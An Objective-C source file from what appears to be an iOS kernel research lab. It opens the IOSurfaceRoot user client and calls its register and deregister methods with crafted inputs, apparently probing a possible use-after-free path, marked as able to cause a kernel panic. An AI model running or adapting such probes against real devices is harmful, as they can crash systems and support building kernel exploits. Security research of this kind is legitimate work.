//
//  P154IOSurfaceF1Gate.m — IOSurface +0xf1 claim-gate residual classification. p154.
//  2026-11-18 (handoff priority 3; murk-sus 27.2 law credited; the fan-out teardown
//  on 27.2 = dereg-before-unlink reorder = PATCHED, so the dangle stage is OFF here).
//

#import "P154IOSurfaceF1Gate.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

typedef mach_port_t io_obj_t;
typedef CFMutableDictionaryRef (*p154_match_t)(const void *);
typedef io_obj_t (*p154_getsvc_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*p154_open_t)(io_obj_t, mach_port_t, uint32_t, mach_port_t *);
typedef kern_return_t (*p154_struct_t)(mach_port_t, uint32_t,
                                       const void *, uint32_t,
                                       const void *, uint32_t,
                                       void *, uint32_t *, void *, uint32_t *);
typedef CFTypeRef (*p154_create_t)(CFDictionaryRef);
typedef uint32_t (*p154_getid_t)(CFTypeRef);

#define P154_BUILD @"p154-f1gate-v1"

static p154_match_t  sM; static p154_getsvc_t sG; static p154_open_t sO;
static p154_struct_t sS; static p154_create_t sCr; static p154_getid_t sId;

static int g_fd = -1;
static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
    if (g_fd >= 0) { const char *c = s.UTF8String; if (c) { write(g_fd, c, strlen(c)); fcntl(g_fd, F_FULLFSYNC); } }
}

typedef struct { uint64_t a, b, c; } p154_in24_t;

@implementation P154IOSurfaceF1Gate

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([docs stringByAppendingPathComponent:@"p154_f1gate_log.txt"].fileSystemRepresentation,
                O_CREAT | O_WRONLY | O_TRUNC, 0644);
    NSString *head = [NSString stringWithFormat:
        @"=== p154 session %@ BUILD %@ ===\n%@\n"
        "IOSurface +0xf1 claim-gate residual classification on 24B156 (handoff priority 3).\n"
        "Murk-sus 27.2 law credited: teardown dereg = unconditional reorder (fan-out patched).\n"
        "Ladder: register x4 shapes -> dup -> dereg -> re-register. READ-ONLY. PANIC-POSSIBLE badge.\n",
        LabLocalMilitaryNow(), P154_BUILD, [LabDeviceProfile identBlock]];
    Lf(@"%@", head); [o appendString:head];

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *dd = h ? h : RTLD_DEFAULT;
    sM  = (p154_match_t)dlsym(dd, "IOServiceMatching");
    sG  = (p154_getsvc_t)dlsym(dd, "IOServiceGetMatchingService");
    sO  = (p154_open_t)dlsym(dd, "IOServiceOpen");
    sS  = (p154_struct_t)dlsym(dd, "IOConnectCallStructMethod");
    sCr = (p154_create_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
    sId = (p154_getid_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
    if (!sS || !sO || !sCr || !sM || !sG) { Lf(@"[-] symbols missing"); if (g_fd>=0) close(g_fd); return o; }

    /* murk §5 dynamic group read — for the record: NOT used without the app group */
    CFMutableDictionaryRef md = sM("IOSurfaceRoot");
    io_obj_t svc = sG(0, md);
    if (md) CFRelease(md);
    mach_port_t conn = 0;
    kern_return_t kr = svc ? sO(svc, mach_task_self(), 0, &conn) : 0xe00002eb;
    /* M2-style 3x open retry (flap law, p114 v1.5+) */
    for (int attempt = 1; attempt <= 3 && !(kr == KERN_SUCCESS && conn); attempt++) {
        if (attempt > 1) { kr = sO(svc, mach_task_self(), 0, &conn); }
        Lf(@"[*] open try %d kr=0x%x conn=%d", attempt, kr, (int)(uintptr_t)conn);
        usleep(150000);
    }
    if (kr != KERN_SUCCESS || !conn) { Lf(@"[-] open flapped through — honest stop"); if (g_fd>=0) close(g_fd); return o; }

    /* one live surface for the ladder */
    CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 2,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int32_t w = 0x100, hh = 0x100;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hh);
    CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), nh);
    CFTypeRef s1 = sCr(sp);
    uint32_t id1 = s1 ? sId(s1) : 0;
    Lf(@"[*] surface id=0x%x", id1);
    CFRelease(nw); CFRelease(nh);
    if (!s1) { Lf(@"[-] no surface — stop"); if (g_fd>=0) close(g_fd); return o; }

    /* the ladder = p168's four shapes on the +0xf1-gated 27.2 law */
    p154_in24_t v[4] = { {id1, 1, id1}, {id1, id1, 1}, {1, 1, id1}, {id1, 1, 0} };
    char outb[32]; uint32_t outn;
    int registered = 0;
    uint8_t dupSeen = 0, reRegisterOK = 0, deregOK = 0;
    for (int vi = 0; vi < 4; vi++) {
        outn = sizeof(outb);
        kern_return_t r = sS(conn, 17, &v[vi], sizeof(p154_in24_t), NULL, 0, outb, &outn, NULL, NULL);
        Lf(@"[17 v%d] kr=0x%x", vi + 1, r);
        if (r == KERN_SUCCESS) {
            registered++;
            /* murk §15: dereg then re-register is legal on 27.x — try it explicitly */
            outn = sizeof(outb);
            kern_return_t rr = sS(conn, 18, &v[vi], sizeof(p154_in24_t), NULL, 0, outb, &outn, NULL, NULL);
            Lf(@"[18 v%d] dereg kr=0x%x", vi + 1, rr);
            deregOK = deregOK || (rr == KERN_SUCCESS);
            outn = sizeof(outb);
            kern_return_t rz = sS(conn, 17, &v[vi], sizeof(p154_in24_t), NULL, 0, outb, &outn, NULL, NULL);
            Lf(@"[17 v%d re-register] kr=0x%x (27.x legal per murk §15)", vi + 1, rz);
            reRegisterOK = reRegisterOK || (rz == KERN_SUCCESS);
            if (!dupSeen) {
                outn = sizeof(outb);
                kern_return_t rd = sS(conn, 17, &v[vi], sizeof(p154_in24_t), NULL, 0, outb, &outn, NULL, NULL);
                Lf(@"[17 v%d dup] kr=0x%x (0x2c9 = the 27.2 reorder makes owner-HIT reachable)", vi + 1, rd);
                dupSeen = (rd == 0xe00002c9 || rd == KERN_SUCCESS);
            }
            /* clean: dereg again */
            outn = sizeof(outb);
            (void)sS(conn, 18, &v[vi], sizeof(p154_in24_t), NULL, 0, outb, &outn, NULL, NULL);
            break;
        }
    }
    /* verdict vs murk's 27.2 law */
    Lf(@"[VERDICT] registered=%d dupSeen=%d deregOK=%d reRegisterOK=%d — %s",
       registered, dupSeen, deregOK, reRegisterOK,
       registered ? "FAN-OUT REACHED ON 24B156 (residual surface — quote codes for murk's 27.2-law write-up)"
                  : "GATE LAW: every shape rejected — the 27.2 claim-gate law stands (residual closed on the daily driver)");

    /* doors-open law (P027): s1 stays alive; conn stays open */
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return o;
}

@end
